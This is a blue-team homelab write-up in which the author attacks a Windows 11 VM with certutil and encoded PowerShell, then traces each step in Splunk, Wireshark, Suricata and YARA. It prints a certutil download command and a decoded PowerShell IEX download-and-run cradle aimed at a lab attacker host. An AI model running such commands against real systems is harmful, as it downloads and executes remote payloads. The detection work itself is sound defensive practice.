---
title: "Homelab - LOLBin Attack Chain & Detection"
date: 2026-09-12
platform: Self-built
difficulty: Medium
category: blue-team
summary: "I built a small Active Directory lab, ran a real attack against a Windows machine, and then caught every step of it in Splunk. This writeup walks through the attack and the detection in plain language."
---

## What I did

I built my own lab instead of using a pre-made room. I set up the machines, ran the attack myself, then switched hats and hunted it like a SOC analyst. Building it and breaking it is the closest thing to the real job.

## The setup

Three machines on one private network:

| Machine | Job |
|---------|-----|
| Kali Linux | The attacker, and also runs Splunk (the SIEM) |
| Windows 11 | The victim. A normal user's computer |
| Windows Server | The domain controller, handles logins |

Before attacking anything, I installed **Sysmon** on the Windows 11 machine. Sysmon is a free Microsoft tool that records what happens on a computer: what programs run, what they connect to, and who started them. Then I set up a **forwarder** to ship those records to Splunk on Kali so I could search them.

## The attack

**Step 1: download a payload with a trusted tool.**

From the victim, I used a built-in Windows program called `certutil` to download a file from the attacker:

```
certutil.exe -urlcache -split -f http://192.168.56.30:8080/update.exe
```

certutil is meant for managing certificates, not downloading files. Attackers abuse tools like this because they are already on the machine and trusted, so they slip past security. The industry name for this is a **LOLBin** (living off the land binary).

**Step 2: run a hidden, encoded command.**

Next I ran PowerShell with three suspicious flags:

- `-nop` skips startup scripts that might log activity
- `-w hidden` hides the window so the user sees nothing
- `-enc` means the command is scrambled (base64) to hide what it does

Any one of these is fine on its own. All three together is a strong sign something is wrong. A normal admin does not hide and scramble commands at the same time.

That command quietly reached back out to the attacker's server. That callback is the "beacon," how malware phones home.

## Catching it in Splunk

Now the fun part. Everything the attack did was recorded, so I went looking for it.

**Find the download:**

```spl
index=main host="WIN11-Client" EventCode=1 Image="*certutil.exe"
```

This showed certutil reaching out to an IP address to grab a file, started by PowerShell, run by a normal user. certutil downloading something is almost always bad.

**Find the hidden command:**

```spl
index=main host="WIN11-Client" EventCode=1 CommandLine="*-enc*"
```

This found the scrambled PowerShell. I copied the scrambled text into **CyberChef**, a free tool for decoding, and it turned back into readable English:

```
IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.30:8080/beacon')
```

Translated: "download a script from the attacker and run it straight in memory." Nothing gets saved to the hard drive, which is why normal antivirus misses it. This is called **fileless** malware.

**Prove it was all one attack:**

I pulled up the "parent" of each program, meaning what launched it. Both the download and the hidden command were started by the same PowerShell window. That ties the whole thing together as one attack from one session, not random unrelated events.

## Checking the network too

I also captured the network traffic during the attack and opened it in **Wireshark**. It showed the victim downloading the file, then calling back to the attacker. Same story the Splunk logs told, confirmed from a second angle.

I ran that same traffic through **Suricata** (a network alarm system) and it flagged the attacker's server automatically. Watching the computer (Sysmon/Splunk) and watching the network (Wireshark/Suricata) both matter, because some attacks only show up in one place.

## Looking at the file itself

I examined the downloaded file without running it, using a tool called `strings` that pulls readable text out of a file. It had a unique tag inside it: `malbot_feed_2.3_beacon_kali`.

I wrote a **YARA rule** (a simple pattern-matching rule) to search for that tag, then scanned a folder and it found every copy of the file. This is how one discovery becomes an automatic hunt you can run across thousands of machines.

## What I learned

- Attackers use trusted, built-in Windows tools so they blend in. You catch them by reading the command, not the program name.
- Hidden plus scrambled PowerShell is a big red flag, especially all at once.
- Fileless attacks that run in memory dodge antivirus. Behavior monitoring like Sysmon is what catches them.
- The strongest proof is showing that suspicious events all came from the same source.
- One clue (a unique string in a file) can be turned into a rule that hunts everywhere.

## What a defender should do

- Alert when certutil is used to download files.
- Alert on PowerShell run with `-enc`, `-nop`, and `-w hidden`.
- Keep Windows Defender and its Tamper Protection turned on. Defender actually blocked this attack at first, which is the control doing its job.
- Send Sysmon and Windows logs to a SIEM so you can search them later, like I did here.
